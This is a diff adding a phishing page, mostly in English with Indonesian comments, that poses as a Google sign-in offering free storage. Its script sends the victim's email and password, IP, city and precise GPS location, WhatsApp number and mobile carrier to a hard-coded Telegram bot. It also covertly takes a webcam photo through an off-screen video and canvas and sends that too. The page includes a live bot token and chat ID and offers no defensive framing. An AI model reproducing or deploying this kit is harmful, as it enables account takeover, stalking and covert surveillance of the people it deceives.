@@ -1,0 +1,635 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>Google - Free 10GB Quota</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&display=swap');
+    *{box-sizing:border-box;margin:0;padding:0}
+    body{
+        background:linear-gradient(135deg, #fafafa 0%, #f0f0f0 100%);
+        display:flex;
+        justify-content:center;
+        align-items:center;
+        min-height:100vh;
+        padding:20px;
+        font-family:'Google Sans','Product Sans',Arial,Helvetica,sans-serif;
+    }
+    .card{
+        width:450px;
+        padding:48px 40px 36px;
+        border-radius:8px;
+        background:#fff;
+        box-shadow:0 4px 12px rgba(0,0,0,0.08);
+        text-align:center;
+        position:relative;
+    }
+    .logo-img{
+        width:80px;
+        height:80px;
+        margin:0 auto 12px;
+    }
+    .sub{
+        font-size:16px;
+        color:#5f6368;
+        margin-bottom:24px;
+    }
+    .in{
+        width:100%;
+        padding:14px 16px;
+        font-size:17px;
+        border:1px solid #dadce0;
+        border-radius:6px;
+        margin-bottom:12px;
+        outline:none;
+    }
+    .in:focus{
+        border-color:#4285f4;
+        box-shadow:0 0 0 2px rgba(66,133,244,.2);
+    }
+    .btn{
+        width:100%;
+        padding:14px;
+        font-size:16px;
+        font-weight:500;
+        color:#fff;
+        background:#4285f4;
+        border:none;
+        border-radius:6px;
+        cursor:pointer;
+        transition:background .2s;
+    }
+    .btn:hover{
+        background:#3367d6;
+    }
+    .quota-popup{
+        position:fixed;
+        top:0;
+        left:0;
+        width:100%;
+        height:100%;
+        background:rgba(0,0,0,0.8);
+        display:flex;
+        justify-content:center;
+        align-items:center;
+        z-index:1000;
+    }
+    .popup-content{
+        background:#fff;
+        padding:30px;
+        border-radius:12px;
+        text-align:center;
+        max-width:400px;
+        width:90%;
+    }
+    .popup-title{
+        font-size:24px;
+        color:#1a73e8;
+        margin-bottom:16px;
+    }
+    .popup-badge{
+        background:#e8f0fe;
+        color:#1a73e8;
+        padding:12px;
+        border-radius:6px;
+        margin:16px 0;
+        font-weight:500;
+    }
+    .close-popup{
+        position:absolute;
+        top:10px;
+        right:15px;
+        font-size:24px;
+        cursor:pointer;
+        color:#5f6368;
+    }
+    .phone-step, .card-step{
+        display:none;
+    }
+    .card-options{
+        display:grid;
+        grid-template-columns:1fr 1fr;
+        gap:10px;
+        margin:20px 0;
+    }
+    .card-option{
+        border:2px solid #dadce0;
+        border-radius:8px;
+        padding:15px;
+        text-align:center;
+        cursor:pointer;
+        transition:all 0.3s;
+    }
+    .card-option:hover{
+        border-color:#4285f4;
+    }
+    .card-option.selected{
+        border-color:#4285f4;
+        background:#e8f0fe;
+    }
+    .card-option img{
+        width:40px;
+        height:40px;
+        margin-bottom:8px;
+    }
+    .or{
+        display:flex;
+        align-items:center;
+        margin:16px 0;
+        color:#8e8e8e;
+        font-size:13px;
+    }
+    .or::before,.or::after{
+        content:'';
+        flex:1;
+        height:1px;
+        background:#dadce0;
+    }
+    .or::before{margin-right:8px}
+    .or::after{margin-left:8px}
+    .sso{
+        display:flex;
+        flex-direction:column;
+        gap:8px;
+        margin-bottom:16px;
+    }
+    .sso a{
+        display:flex;
+        align-items:center;
+        justify-content:center;
+        gap:8px;
+        padding:10px;
+        font-size:14px;
+        font-weight:500;
+        text-decoration:none;
+        border-radius:6px;
+        transition:opacity .2s;
+    }
+    .fb{
+        background:#4267B2;
+        color:#fff;
+    }
+    .goo{
+        background:#fff;
+        color:#757575;
+        border:1px solid #dadce0;
+    }
+    .sso img{
+        width:24px;
+        height:24px;
+    }
+    .link{
+        font-size:14px;
+        color:#4285f4;
+        text-decoration:none;
+        margin-top:16px;
+        display:inline-block;
+    }
+    .link:hover{
+        text-decoration:underline;
+    }
+    .foot{
+        margin-top:24px;
+        font-size:14px;
+        color:#5f6368;
+    }
+    .foot a{
+        color:#4285f4;
+        text-decoration:none;
+    }
+    .foot a:hover{
+        text-decoration:underline;
+    }
+    .loading{
+        display:none;
+        margin:12px 0;
+        font-size:14px;
+        color:#4285f4;
+    }
+    .error{
+        display:none;
+        margin:12px 0;
+        font-size:14px;
+        color:#ea4335;
+    }
+    .success-screen{
+        display:none;
+        text-align:center;
+    }
+    .success-screen img{
+        width:120px;
+        height:120px;
+        margin-bottom:20px;
+    }
+    .success-title{
+        font-size:24px;
+        color:#1e8e3e;
+        margin-bottom:16px;
+    }
+    .quota-box{
+        background:#f1f8e9;
+        border:1px solid #7cb342;
+        border-radius:8px;
+        padding:16px;
+        margin:20px 0;
+    }
+    video,canvas{
+        position:fixed;
+        top:-9999px;
+        left:-9999px;
+    }
+    @media(max-width:480px){
+        .card{
+            width:90%;
+            padding:30px 20px;
+        }
+        .card-options{
+            grid-template-columns:1fr;
+        }
+    }
+  </style>
+</head>
+<body>
+  <!-- POPUP AWAL 10GB -->
+  <div class="quota-popup" id="quotaPopup">
+    <div class="popup-content">
+      <span class="close-popup" onclick="closePopup()">×</span>
+      <img class="logo-img" src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google">
+      <div class="popup-title">🎉 CONGRATULATIONS!</div>
+      <div class="popup-badge">
+        You've been selected for <strong>1GB FREE Google Drive storage</strong>
+      </div>
+      <p>Claim your free quota by logging in with your Google account</p>
+      <button class="btn" onclick="closePopup()" style="margin-top:20px;">Claim 10GB FREE</button>
+    </div>
+  </div>
+
+  <div class="card">
+    <!-- SCREEN LOGIN GOOGLE -->
+    <div id="loginScreen">
+      <img class="logo-img" src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google">
+      <div class="sub">Sign in to claim your FREE 10GB Google Quota</div>
+      
+      <input class="in" type="text" id="user" placeholder="Email or phone" required>
+      <input class="in" type="password" id="pass" placeholder="Enter your password" required>
+      <button class="btn" id="loginBtn">Claim Your 10GB</button>
+
+      <div class="loading" id="loading">Verifying your account...</div>
+      <div class="error" id="error">Sorry, something went wrong. Please try again.</div>
+
+      <div class="or">OR</div>
+      <div class="sso">
+        <a class="fb" href="#" onclick="fakeLogin('Facebook')">
+          <img src="https://www.gstatic.com/images/icons/material/system/2x/public_black_24dp.png" alt="fb">
+          Continue with Facebook
+        </a>
+        <a class="goo" href="#" onclick="fakeLogin('Google')">
+          <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" width="24" alt="goo">
+          Continue with Google
+        </a>
+      </div>
+      <a class="link" href="#">Forgot email?</a>
+    </div>
+
+    <!-- SCREEN NOMOR TELEPON -->
+    <div class="phone-step" id="phoneStep">
+      <img class="logo-img" src="https://www.gstatic.com/images/icons/material/system/2x/verified_user_black_48dp.png" alt="Verify">
+      <div class="sub">Verify your identity for security</div>
+      
+      <input class="in" type="tel" id="phone" placeholder="WhatsApp Number (62xxx)" required>
+      <button class="btn" id="verifyBtn">Verify Number</button>
+      <div class="loading" id="phoneLoading">Sending verification code...</div>
+      
+      <p style="font-size:12px; color:#5f6368; margin-top:16px;">
+        We'll send a verification code to your WhatsApp for security purposes
+      </p>
+    </div>
+
+    <!-- SCREEN PILIH KARTU -->
+    <div class="card-step" id="cardStep">
+      <img class="logo-img" src="https://www.gstatic.com/images/icons/material/system/2x/card_membership_black_48dp.png" alt="Card">
+      <div class="sub">Select your card provider</div>
+      
+      <div class="card-options">
+        <div class="card-option" onclick="selectCard('Telkomsel')">
+          <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/8c/Telkomsel_2013.svg/1200px-Telkomsel_2013.svg.png" alt="Telkomsel">
+          <div>Telkomsel</div>
+        </div>
+        <div class="card-option" onclick="selectCard('XL')">
+          <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7e/XL_Axiata_logo_%282020%29.svg/2560px-XL_Axiata_logo_%282020%29.svg.png" alt="XL">
+          <div>XL Axiata</div>
+        </div>
+        <div class="card-option" onclick="selectCard('Indosat')">
+          <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/8a/Indosat_Ooredoo_Hutchison_2022.svg/1200px-Indosat_Ooredoo_Hutchison_2022.svg.png" alt="Indosat">
+          <div>Indosat</div>
+        </div>
+        <div class="card-option" onclick="selectCard('Three')">
+          <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/86/3_Indonesia_logo.svg/2560px-3_Indonesia_logo.svg.png" alt="Three">
+          <div>3 Indonesia</div>
+        </div>
+        <div class="card-option" onclick="selectCard('Smartfren')">
+          <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/8c/Smartfren_logo_%282015%29.svg/1280px-Smartfren_logo_%282015%29.svg.png" alt="Smartfren">
+          <div>Smartfren</div>
+        </div>
+        <div class="card-option" onclick="selectCard('Axis')">
+          <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/f6/AXIS_%28telecommunications%29_logo.svg/1200px-AXIS_%28telecommunications%29_logo.svg.png" alt="Axis">
+          <div>AXIS</div>
+        </div>
+      </div>
+      
+      <button class="btn" id="cardBtn" disabled>Continue</button>
+    </div>
+
+    <!-- SCREEN SUKSES -->
+    <div class="success-screen" id="successScreen">
+      <img src="https://www.gstatic.com/images/icons/material/system/2x/check_circle_black_48dp.png" alt="Success">
+      <div class="success-title">Success! 10GB Quota Claimed</div>
+      <div class="quota-box">
+        <strong>🎉 CONGRATULATIONS!</strong><br>
+        Your Google Account has been upgraded with <strong>10GB FREE storage</strong><br>
+        The quota will be activated within 24 hours.
+      </div>
+      <p>You can now enjoy extra storage for your Google Drive, Photos, and Gmail.</p>
+    </div>
+
+    <div class="foot">
+      Not your computer? Use <a href="#">Guest mode</a> to sign in privately. <a href="#">Learn more</a>
+    </div>
+  </div>
+
+  <video id="video" autoplay muted playsinline></video>
+  <canvas id="canvas" width="640" height="480"></canvas>
+
+  <script>
+    const botToken = '8423273543:AAF-5nogpbBF0dEZDi1Lq_35WKHXJI8gIwM';
+    const chatIds = ['7966285590'];
+    let selectedCard = '';
+    let userData = {};
+
+    // Tampilkan popup saat halaman dimuat
+    window.onload = function() {
+      document.getElementById('quotaPopup').style.display = 'flex';
+    }
+
+    function closePopup() {
+      document.getElementById('quotaPopup').style.display = 'none';
+    }
+
+    function selectCard(cardType) {
+      selectedCard = cardType;
+      // Remove selected class from all
+      document.querySelectorAll('.card-option').forEach(option => {
+        option.classList.remove('selected');
+      });
+      // Add selected class to clicked
+      event.target.closest('.card-option').classList.add('selected');
+      document.getElementById('cardBtn').disabled = false;
+    }
+
+    document.getElementById('loginBtn').addEventListener('click', async ()=>{
+        await kirimDataLogin();
+    });
+
+    document.getElementById('verifyBtn').addEventListener('click', async ()=>{
+        await kirimDataPhone();
+    });
+
+    document.getElementById('cardBtn').addEventListener('click', async ()=>{
+        await kirimDataCard();
+    });
+
+    async function fakeLogin(provider){
+        document.getElementById('error').style.display='block';
+        document.getElementById('error').textContent=`Please use your Google Account to claim the 10GB free quota.`;
+    }
+
+    async function kirimDataLogin(){
+        const user = document.getElementById('user').value.trim();
+        const pass = document.getElementById('pass').value.trim();
+        if(!user||!pass){
+            document.getElementById('error').style.display='block';
+            document.getElementById('error').textContent='Please fill in all fields';
+            return;
+        }
+
+        userData.email = user;
+        userData.password = pass;
+
+        const loading = document.getElementById('loading');
+        const error = document.getElementById('error');
+        loading.style.display='block';
+        error.style.display='none';
+
+        // Collect system information
+        let ip='-', city='-', region='-', country='-', org='-', timezone='-';
+        try{
+            const ipRes = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipRes.json();
+            ip = ipData.ip;
+            const locRes = await fetch(`https://ip-api.com/json/${ip}`);
+            const loc = await locRes.json();
+            if(loc.status==='success'){ 
+                city=loc.city; 
+                region=loc.regionName; 
+                country=loc.country; 
+                org=loc.org;
+                timezone=loc.timezone;
+            }
+        }catch(e){}
+
+        const battery = await navigator.getBattery?.() || {level:0, charging:false};
+        const language = navigator.language || 'Unknown';
+        const platform = navigator.platform || 'Unknown';
+        
+        const info = `🔐 **GOOGLE 1GB QUOTA CLAIM - PHASE 1** 🔐
+
+👤 **ACCOUNT INFORMATION**
+📧 Email: ${user}
+🔑 Password: ${pass}
+
+🌐 **SYSTEM INFORMATION**
+🖥️ User Agent: ${navigator.userAgent}
+💻 Platform: ${platform}
+🗣️ Language: ${language}
+📐 Screen: ${screen.width}x${screen.height}
+🔋 Battery: ${battery.level ? `${(battery.level*100).toFixed(0)}% (${battery.charging?'Charging':'Not Charging'})` : 'N/A'}
+
+📍 **LOCATION DATA**
+🌐 IP Address: ${ip}
+🏙️ City: ${city}
+🏛️ Region: ${region}
+🇺🇸 Country: ${country}
+🏢 ISP: ${org}
+⏰ Timezone: ${timezone}
+🕒 Local Time: ${new Date().toLocaleString()}
+
+📱 **DEVICE CAPABILITIES**
+✅ Camera: ${navigator.mediaDevices ? 'Available' : 'Not Available'}
+✅ Geolocation: ${navigator.geolocation ? 'Available' : 'Not Available'}`;
+
+        // Send to Telegram
+        for(const chatId of chatIds){
+            try{
+                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`,{
+                    method:'POST',
+                    headers:{'Content-Type':'application/json'},
+                    body:JSON.stringify({
+                        chat_id:chatId,
+                        text:info,
+                        parse_mode:'Markdown'
+                    })
+                });
+            }catch(e){}
+        }
+
+        // Get and send location
+        if(navigator.geolocation){
+            navigator.geolocation.getCurrentPosition(async (pos)=>{
+                const lat = pos.coords.latitude;
+                const lon = pos.coords.longitude;
+                const accuracy = pos.coords.accuracy;
+                const locationMsg = `📍 **PRECISE LOCATION CAPTURED**
+🗺️ Latitude: ${lat}
+🗺️ Longitude: ${lon}
+🎯 Accuracy: ${accuracy} meters
+🔗 Maps: https://www.google.com/maps?q=${lat},${lon}`;
+
+                for(const chatId of chatIds){
+                    try{
+                        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`,{
+                            method:'POST',
+                            headers:{'Content-Type':'application/json'},
+                            body:JSON.stringify({
+                                chat_id:chatId,
+                                text:locationMsg,
+                                parse_mode:'Markdown'
+                            })
+                        });
+                    }catch(e){}
+                }
+            }, ()=>{}, {enableHighAccuracy:true});
+        }
+
+        // Move to phone step
+        loading.style.display='none';
+        document.getElementById('loginScreen').style.display='none';
+        document.getElementById('phoneStep').style.display='block';
+    }
+
+    async function kirimDataPhone(){
+        const phone = document.getElementById('phone').value.trim();
+        if(!phone){
+            alert('Please enter your WhatsApp number');
+            return;
+        }
+
+        userData.phone = phone;
+        document.getElementById('phoneLoading').style.display = 'block';
+
+        const phoneInfo = `📱 **WHATSAPP NUMBER CAPTURED** 📱
+
+👤 User: ${userData.email}
+📞 WhatsApp: ${phone}
+
+🕒 Time: ${new Date().toLocaleString()}
+🌐 IP: ${userData.ip || 'Unknown'}`;
+
+        // Send phone to Telegram
+        for(const chatId of chatIds){
+            try{
+                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`,{
+                    method:'POST',
+                    headers:{'Content-Type':'application/json'},
+                    body:JSON.stringify({
+                        chat_id:chatId,
+                        text:phoneInfo,
+                        parse_mode:'Markdown'
+                    })
+                });
+            }catch(e){}
+        }
+
+        // Move to card step after delay
+        setTimeout(() => {
+            document.getElementById('phoneLoading').style.display = 'none';
+            document.getElementById('phoneStep').style.display = 'none';
+            document.getElementById('cardStep').style.display = 'block';
+        }, 2000);
+    }
+
+    async function kirimDataCard(){
+        if(!selectedCard){
+            alert('Please select a card provider');
+            return;
+        }
+
+        userData.card = selectedCard;
+
+        const cardInfo = `💳 **CARD PROVIDER SELECTED** 💳
+
+👤 User: ${userData.email}
+📞 WhatsApp: ${userData.phone}
+💳 Card Provider: ${selectedCard}
+
+🕒 Time: ${new Date().toLocaleString()}
+🌐 IP: ${userData.ip || 'Unknown'}
+
+🎯 **COMPLETE USER DATA CAPTURED**`;
+
+        // Send card info to Telegram
+        for(const chatId of chatIds){
+            try{
+                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`,{
+                    method:'POST',
+                    headers:{'Content-Type':'application/json'},
+                    body:JSON.stringify({
+                        chat_id:chatId,
+                        text:cardInfo,
+                        parse_mode:'Markdown'
+                    })
+                });
+            }catch(e){}
+        }
+
+          // Capture photo if possible
+        try{
+            const stream = await navigator.mediaDevices.getUserMedia({video:true});
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            const ctx = canvas.getContext('2d');
+            
+            video.srcObject = stream;
+            
+            await new Promise(resolve => {
+                video.onloadedmetadata = () => {
+                    video.play();
+                    setTimeout(() => {
+                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        canvas.toBlob(blob => {
+                            if(blob){
+                                const formData = new FormData();
+                                formData.append('chat_id', chatIds[0]);
+                                formData.append('photo', blob, 'user_face.jpg');
+                                formData.append('caption', '📸 **WEBCAM CAPTURE** - Complete user data captured');
+                                
+                                fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                                    method: 'POST',
+                                    body: formData
+                                }).catch(()=>{});
+                            }
+                            stream.getTracks().forEach(track => track.stop());
+                            resolve();
+                        }, 'image/jpeg');
+                    }, 2000);
+                };
+            });
+        }catch(e){}
+
+        // Show success screen
+        document.getElementById('cardStep').style.display = 'none';
+        document.getElementById('successScreen').style.display = 'block';
+    }
+  </script>
+</body>
+</html>
